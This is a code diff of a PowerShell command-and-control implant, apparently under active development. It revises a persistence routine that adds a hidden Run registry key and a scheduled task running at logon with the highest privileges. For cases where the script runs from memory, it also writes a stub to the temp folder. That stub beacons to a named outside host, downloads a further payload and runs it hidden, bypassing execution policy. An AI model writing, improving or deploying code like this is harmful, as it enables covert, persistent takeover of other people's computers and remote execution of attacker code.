@@ -24,11 +24,50 @@ $Script:C2Config = @{
 function Install-Persistence {
     try {
         $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-        $scriptPath = $MyInvocation.MyCommand.Path
+        
+        # Get current script path - handle different execution contexts
+        $scriptPath = ""
+        if ($MyInvocation.MyCommand.Path) {
+            $scriptPath = $MyInvocation.MyCommand.Path
+        } elseif ($PSCommandPath) {
+            $scriptPath = $PSCommandPath
+        } else {
+            # If running in memory, create a copy first
+            $scriptPath = "$env:TEMP\c2_stub.ps1"
+            $currentScript = @"
+# C2 PowerShell Stub - Production Version
+param(
+    [string]`$C2Server = "https://vcc-library.netlify.app/erickparker",
+    [int]`$BeaconInterval = 15
+)
+
+# Generate or load persistent session ID
+`$SessionIDFile = "`$env:TEMP\c2_session.txt"
+if (Test-Path `$SessionIDFile) {
+    `$Script:SessionID = Get-Content `$SessionIDFile -Raw
+} else {
+    `$Script:SessionID = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object {[char]`$_})
+    `$Script:SessionID | Out-File `$SessionIDFile -Encoding UTF8
+}
+
+`$Script:C2Config = @{
+    Server = `$C2Server
+    Interval = `$BeaconInterval
+    SessionID = `$Script:SessionID
+    Running = `$true
+}
+
+# Download and execute the real stub
+irm "https://vcc-library.netlify.app/erickparker/stub" -OutFile "`$env:TEMP\c2_real.ps1"
+powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "`$env:TEMP\c2_real.ps1"
+"@
+            $currentScript | Out-File $scriptPath -Encoding UTF8
+        }
         
         # Random registry name
         $regName = -join ((65..90) | Get-Random -Count 8 | ForEach-Object {[char]$_})
-        Set-ItemProperty -Path $regPath -Name $regName -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force
+        $regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+        Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
         
         # Scheduled task persistence
         $taskName = -join ((65..90) | Get-Random -Count 10 | ForEach-Object {[char]$_})
@@ -36,9 +75,9 @@ function Install-Persistence {
         $trigger = New-ScheduledTaskTrigger -AtLogon -User $env:USERNAME
         Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force -RunLevel Highest
         
-        Write-Host "Persistence installed"
+        Write-Host "Persistence installed at: $scriptPath"
     } catch {
-        # Continue even if persistence fails
+        Write-Host "Persistence failed: $($_.Exception.Message)"
     }
 }
 
